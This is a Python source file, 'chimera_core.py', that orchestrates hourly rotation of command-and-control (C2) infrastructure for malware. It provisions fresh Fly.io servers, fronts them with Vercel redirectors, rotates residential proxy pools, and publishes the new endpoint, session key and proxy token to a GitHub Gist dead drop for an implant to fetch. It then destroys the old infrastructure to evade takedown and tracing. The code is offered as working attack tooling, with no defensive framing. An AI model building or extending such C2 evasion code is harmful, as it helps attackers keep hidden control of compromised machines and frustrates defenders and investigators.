# chimera_core.py — Main rotation orchestrator
import time
import threading
import logging
from datetime import datetime, timezone
from typing import Any, Dict, Optional

from core.fly_provisioner import FlyProvisioner
from core.vercel_deployer import VercelDeployer
from core.deaddrop import DeadDrop
from core.proxy_rotator import ProxyRotator

logging.basicConfig(level=logging.INFO, format="[%(asctime)s] %(message)s")

class ChimeraRotation:
    """
    Orchestrates the hourly rotation cycle.
    Each cycle: provision new infra → update dead drop → teardown old infra.
    """

    def __init__(self, config: Dict[str, Any]):
        self.fly = FlyProvisioner(
            api_token=config["fly_api_token"],
            org_slug=config["fly_org"],
            region=config["fly_region"],        # e.g. "iad", "fra", "sin"
            app_base=config["fly_app_base"]      # e.g. "chimera-c2"
        )
        self.vercel = VercelDeployer(
            api_token=config["vercel_api_token"],
            team_slug=config["vercel_team"],
            project_base=config["vercel_project_base"]  # e.g. "chimera-front"
        )
        self.drop = DeadDrop(
            gist_token=config["github_token"],
            gist_id=config["gist_id"]
        )
        self.proxies = ProxyRotator(
            provider=config["proxy_provider"],   # "brightdata" | "oxylabs" | "smartproxy"
            username=config["proxy_user"],
            password=config["proxy_pass"],
            endpoint=config["proxy_endpoint"]
        )

        self.cycle_minutes = config.get("cycle_minutes", 60)
        self._current: Optional[Dict[str, Any]] = None          # holds active session metadata
        self._previous: Optional[Dict[str, Any]] = None         # holds previous session for teardown
        self._lock = threading.Lock()
        self._running = False

    def _rotate_cycle(self) -> Dict[str, Any]:
        """Single rotation: build new, swap, destroy old."""
        ts = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")

        # 1. Provision new Fly.io VM (C2 server)
        logging.info(f"[cycle {ts}] Provisioning new Fly.io VM...")
        fly_session = self.fly.provision_vm(suffix=ts)
        # fly_session = {app_name, vm_id, ip, internal_port, region}

        # 2. Deploy new Vercel page → reverse proxy to Fly VM
        logging.info(f"[cycle {ts}] Deploying Vercel redirector → {fly_session['ip']}...")
        vercel_session = self.vercel.deploy_redirector(
            target_host=fly_session["ip"],
            target_port=fly_session["internal_port"],
            suffix=ts
        )
        # vercel_session = {project_name, deployment_url, deployment_id}

        # 3. Rotate residential proxy credentials
        logging.info(f"[cycle {ts}] Rotating residential proxy pool...")
        proxy_session = self.proxies.rotate_pool()
        # proxy_session = {proxy_url, proxy_auth, rotation_token}

        # 4. Push new endpoint config to dead drop
        new_config: Dict[str, Any] = {
            "v": 1,
            "ts": ts,
            "url": f"https://{vercel_session['deployment_url']}",
            "key": fly_session.get("session_key", ""),
            "px": proxy_session["rotation_token"]   # implant uses this to pick proxy
        }
        logging.info(f"[cycle {ts}] Updating dead drop...")
        self.drop.update(new_config)

        return {
            "fly": fly_session,
            "vercel": vercel_session,
            "proxy": proxy_session,
            "config": new_config,
            "ts": ts
        }

    def _teardown(self, session: Optional[Dict[str, Any]]):
        """Destroy previous cycle's infrastructure."""
        if not session:
            return
        ts = session["ts"]
        logging.info(f"[teardown {ts}] Destroying Fly.io VM {session['fly']['vm_id']}...")
        self.fly.destroy_vm(session["fly"]["app_name"], session["fly"]["vm_id"])

        logging.info(f"[teardown {ts}] Removing Vercel deployment {session['vercel']['deployment_id']}...")
        self.vercel.destroy_deployment(session["vercel"]["deployment_id"])

        logging.info(f"[teardown {ts}] Done. Infrastructure fully destroyed.")

    def start(self):
        """Begin the rotation loop."""
        self._running = True
        logging.info("Chimera rotation engine started.")

        while self._running:
            with self._lock:
                try:
                    new_session = self._rotate_cycle()
                    self._teardown(self._previous)
                    self._previous = self._current
                    self._current = new_session
                    logging.info(
                        f"Active C2: {new_session['config']['url']} "
                        f"(Fly: {new_session['fly']['ip']}, "
                        f"Proxy: {new_session['proxy']['proxy_url']})"
                    )
                except Exception as e:
                    logging.error(f"Rotation cycle failed: {e}")

            # Sleep until next cycle
            time.sleep(self.cycle_minutes * 60)

    def stop(self):
        self._running = False
        # Final teardown
        if self._current:
            self._teardown(self._current)
        if self._previous:
            self._teardown(self._previous)
        logging.info("Chimera stopped. All infrastructure destroyed.")

